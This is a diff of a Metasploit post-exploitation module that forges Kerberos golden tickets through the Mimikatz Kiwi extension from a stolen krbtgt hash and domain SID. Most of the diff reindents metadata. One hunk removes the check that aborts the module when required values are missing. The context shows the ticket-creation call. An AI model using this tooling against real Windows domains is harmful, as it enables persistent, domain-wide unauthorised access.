@@ -10,25 +10,26 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Error
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name'         => 'Windows Escalate Golden Ticket',
-                      'Description'  => %q{
-                          This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no
-                        options are applied it will attempt to identify the current domain, the domain administrator
-                        account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default
-                        the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.
-                        },
-                      'License'      => MSF_LICENSE,
-                      'Author'       => [
-                        'Ben Campbell'
-                      ],
-                      'Platform'     => [ 'win' ],
-                      'SessionTypes' => [ 'meterpreter' ],
-                      'References'   =>
-                            [
-                              ['URL', 'https:/github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos'],
-                              ['URL', 'http://blog.cobalstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/']
-                            ]
+    super(update_info(
+      info,
+      'Name'         => 'Windows Escalate Golden Ticket',
+      'Description'  => %q{
+          This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no
+        options are applied it will attempt to identify the current domain, the domain administrator
+        account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default
+        the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.
+        },
+      'License'      => MSF_LICENSE,
+      'Author'       => [
+        'Ben Campbell'
+      ],
+      'Platform'     => [ 'win' ],
+      'SessionTypes' => [ 'meterpreter' ],
+      'References'   =>
+            [
+              ['URL', 'https:/github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos'],
+              ['URL', 'http://blog.cobalstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/']
+            ]
     ))
 
     register_options(
@@ -101,11 +102,7 @@ class Metasploit3 < Msf::Post
         fail_with(Failure::Unknown, 'Unable to find User')
       end
     end
-
-    unless user && domain && domain_sid && krbtgt_hash
-      fail_with(Failure::Unknown, 'Not all requirements obtained')
-    end
-
+    
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
     ticket = client.kiwi.golden_ticket_create(user, domain, domain_sid, krbtgt_hash, id, groups)
 
